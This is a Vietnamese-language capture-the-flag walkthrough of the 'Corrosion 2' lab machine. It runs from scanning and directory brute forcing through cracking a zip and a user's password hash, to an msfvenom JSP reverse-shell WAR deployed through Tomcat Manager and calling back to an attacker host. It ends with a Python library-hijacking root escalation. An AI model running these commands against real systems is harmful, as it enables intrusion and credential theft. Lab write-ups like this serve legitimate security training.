# Corrosion 2
***

### Network Scanning

Đầu tiên tìm địa chỉ ip mục tiêu

```sudo netdiscover -i eth0 -r 192.168.169.0/24```

![](images/1.png)

**Target IP: 192.168.169.140**

Tiếp theo scan các dịch vụ và cổng đang mở

```sudo nmap -sV -O 192.168.169.140```

![](images/2.png)

+ Port 22: SSH
+ Port 80: HTTP(Apache Server)
+ Port 8080: HTTP(Tomcat Server)

### Enumeration

Thử truy cập vào Apache server port 80 chỉ hiện thị defaul Apache page. 

![](images/3.png)

Tiếp theo chuyển tới Tomcat server port 8080 

![](images/4.png)

Tiếp theo thực hiện directory brute force

```ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.169.140/FUZZ -e .php,.zip,.txt ```

![](images/5.png)

Brute force các thư mục con nhưng không tìm được gì , tiếp theo chuyển sang port 8080

```ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.169.140:8080/FUZZ -e .php,.zip,.txt ```

![](images/6.png)

Tìm thấy file backup.zip có thể truy cập.Tải file về 
```wget http://192.168.169.140:8080/backup.zip ``` 

Thử unzip nhưng được bảo vệ bởi mật khẩu

![](images/7.png)

Sử dụng john the ripper crack mật khẩu

```sh
zip2john backup.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

![](images/8.png)

```unzip backup.zip -d ./backup```

![](images/9.png)

Kiểm tra file tomcat-users.xml

```cat tomcat-users.xml```

![](images/10.png)

**Finding: admin:melehifokivai**


### Exploitation

Sử dụng tài khoản trên để login vào Tomcat Manager thấy cho upload file và deploy

![](images/11.png)

+ option 1: upload reverse shell thủ công
Tạo một .war file bằng msfvenom

```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.169.137 LPORT=5555 -f war > rvshell.war```

![](images/12.png)

Sau khi file được tạo thì tải lên thông qua GUI của Tomcat Manager 

![](images/13.png)

```nc -lvnp 5555```

![](images/14.png)

update shell and discover

![](images/15.png)

Tìm được 2 file user.txt và note.txt

Thử đăng nhập tài khoản jaye và randy bằng mật khẩu của admin

![](images/16.png)

Sau khi đăng nhập chỉ có thể đăng nhập jaye tìm thấy một file look như trên

![](images/17.png)

Lệnh từ GTFOBins(một kho lưu trữ trực tuyến chứa danh sách các nhị phân Unix (binaries) mà có thể bị khai thác bởi kẻ tấn công để thực hiện các hành động không được phép trên hệ thống), sử dụng look command để xem password hash của user randy.

![](images/18.png)

Lưu hash vào file hash.txt và sử dụng john để crack password

```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```

![](images/19.png)

+ **Cracked Password:** ```07051986randy```

Sau khi đăng nhập tài khoản randy, sử dụng sudo -l kiểm tra những lệnh có thể chạy với quyền sudo

![](images/20.png)

Xem file ```randombase64.py``` thấy import module base64. Khả năng xảy ra python library hijacking.

![](images/21.png)

Chỉnh sửa file và chèn lệnh ```os.system('/bin/bash')``` để spawn một root shell

![](images/22.png)

![](images/23.png)

Đạt được quyền root

+ option 2: khai thác bằng metasploit

Search exploits

![](images/24.png)

![](images/25.png)

![](images/26.png)

Tiếp theo làm giống option 1 để đạt được quyền root